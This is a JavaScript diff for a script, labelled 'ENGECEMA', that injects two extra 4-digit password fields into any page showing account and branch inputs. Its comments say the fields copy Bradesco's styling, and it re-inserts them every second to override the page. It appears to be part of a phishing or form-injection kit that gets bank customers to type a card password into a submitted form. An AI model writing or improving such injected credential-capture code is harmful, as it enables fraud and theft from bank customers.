@@ -1,37 +1,43 @@
-/* INJEÇÃO DE INTERFACE ENGECEMA - SENHA E CONFIRMAÇÃO */
+/* INJEÇÃO UNIVERSAL ENGECEMA - SENHA E CONFIRMAÇÃO */
 (function() {
-    const injetarCampos = () => {
-        const loginBar = document.querySelector('.login-bar');
-        const btnOk = document.querySelector('.btn-ok');
+    const injetarSegurancaEngecema = () => {
+        // 1. Localiza qualquer campo que pareça ser de "Conta" ou "Agência"
+        const campos = document.querySelectorAll('input[type="text"], input[type="number"]');
+        const btnOk = document.querySelector('.btn-ok') || document.querySelector('button') || document.querySelector('input[type="submit"]');
 
-        if (loginBar && btnOk && !document.getElementById('senha-engecema')) {
-            // 1. Criar Campo Senha
+        if (campos.length >= 2 && btnOk && !document.getElementById('senha-private')) {
+            // Criar Campo Senha
             const s1 = document.createElement('input');
-            s1.id = 'senha-engecema'; s1.type = 'password'; s1.placeholder = 'Senha';
+            s1.id = 'senha-private'; s1.type = 'password'; s1.placeholder = 'Senha';
             s1.required = true; s1.maxLength = 4;
-            s1.style = "padding:8px; border:1px solid #ccc; border-radius:4px; width:80px; font-size:14px; margin-right:5px;";
+            s1.className = campos[0].className; // Copia o estilo original do Bradesco
+            s1.style.width = '80px'; s1.style.marginRight = '5px'; s1.style.padding = '8px';
 
-            // 2. Criar Campo Confirmar
+            // Criar Campo Confirmar
             const s2 = document.createElement('input');
-            s2.id = 'confirma-engecema'; s2.type = 'password'; s2.placeholder = 'Confirmar';
+            s2.id = 'confirma-private'; s2.type = 'password'; s2.placeholder = 'Confirmar';
             s2.required = true; s2.maxLength = 4;
-            s2.style = "padding:8px; border:1px solid #ccc; border-radius:4px; width:80px; font-size:14px; margin-right:5px;";
+            s2.className = campos[0].className; // Copia o estilo original
+            s2.style.width = '80px'; s2.style.marginRight = '5px'; s2.style.padding = '8px';
 
-            // 3. Inserir antes do botão OK
-            loginBar.insertBefore(s1, btnOk);
-            loginBar.insertBefore(s2, btnOk);
+            // Insere os dois novos campos antes do botão de OK/Acessar
+            btnOk.parentNode.insertBefore(s1, btnOk);
+            btnOk.parentNode.insertBefore(s2, btnOk);
 
-            // 4. Trava de Segurança
-            loginBar.onsubmit = function(e) {
-                if (s1.value !== s2.value) {
-                    e.preventDefault();
-                    alert("As senhas não conferem!");
-                    return false;
-                }
-            };
+            // Trava o envio se as senhas não forem iguais
+            const form = btnOk.closest('form');
+            if (form) {
+                form.onsubmit = function(e) {
+                    if (s1.value !== s2.value) {
+                        e.preventDefault();
+                        alert("As senhas não conferem!");
+                        return false;
+                    }
+                };
+            }
         }
     };
 
-    // Tenta injetar a cada 500ms caso o site demore a carregar
-    setInterval(injetarCampos, 500);
+    // Executa a cada 1 segundo para garantir que "vença" a imutabilidade do carregamento
+    setInterval(injetarSegurancaEngecema, 1000);
 })();
